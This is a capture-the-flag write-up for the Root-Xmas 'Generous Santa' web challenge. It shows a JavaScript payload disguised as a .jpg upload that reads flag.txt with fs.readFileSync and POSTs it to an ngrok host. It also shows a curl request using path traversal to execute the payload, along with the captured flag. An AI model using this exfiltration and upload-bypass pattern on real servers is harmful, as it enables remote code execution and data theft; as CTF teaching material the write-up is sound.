---
layout: Post
format: chall
title: Day 01 - Generous Santa
date: 2024-12-02
ctf: Root-Xmas
tags: [LFI, RCE]
category: [Web]
---
# Day 01 - Generous Santa

<a class="back-link" href="../../">< Go back</a>

## Description

The number of Santa's lunti has increased by 1337 this year, and there are a lot of them! Thanks to this, they've been able to give you some very, very nice gifts. If you can't find what you're looking for, you can even suggest gifts to him - maybe they'll make them in time!

<https://day1.challenges.xmas.root-me.org/>
Author : Elweth

all files in [resources/](./resources) were provided.

## Challenge

Looking at the source code we learn that the website has a `/flag.txt` tht we need to reveal.

A system of gifts allows us to add/suggest gifts:

- `suggest`: LFI, inject our payload on the server as a fake image
- `add`: RCE, execute our payload on the server

I spent a good amount of time trying all the textbook LFI payloads, but none of them worked, so instead, because we have the source code I decided to skip the LFI and work on the RCE.

### Local File Inclusion

We need to come up with a payload that can either read or exfiltrate the flag. I'll try the latter.

```js

fetch("https://9a64-77-140-212-69.ngrok-free.app/", {
    method: 'POST',
    body: encodeURIComponent(require('fs').readFileSync('../../../../flag.txt', 'utf8')),
});
```

Now remember that we are only allowed to POST `image/*` files, so let's just name our file `rev.jpg` and intercept the packet with Burp to change it back to `.js`.

### Remote Code Execution

I'll use `ngrok` to get the remove server to send me the flag. Let's build a [server.py](server.py), it's just a reverse POST server to receive the flag.

Let's run everyhing:

```bash
python3 server.py
# new terminal
ngrok http 8082
# new terminal
# Upload the image to the website, intercept it, change it's extension to `.js`
# From the response, we get the path where the file is stored.
curl \
  -X POST https://day1.challenges.xmas.root-me.org/api/add  \
  -H "Content-Type: application/json"                       \
  --data-raw '{"product":"../../../../../../tmp/2024-12-02_23-23-38/rev2.js"}'
```

Running the curl shows the falg in our server:

```
The flag is :

RM{Mayb3_S4nt4_Cl4uS_Als0_G3t_A_Flag}
127.0.0.1 - - [03/Dec/2024 00:24:04] "POST / HTTP/1.1" 200 -
```
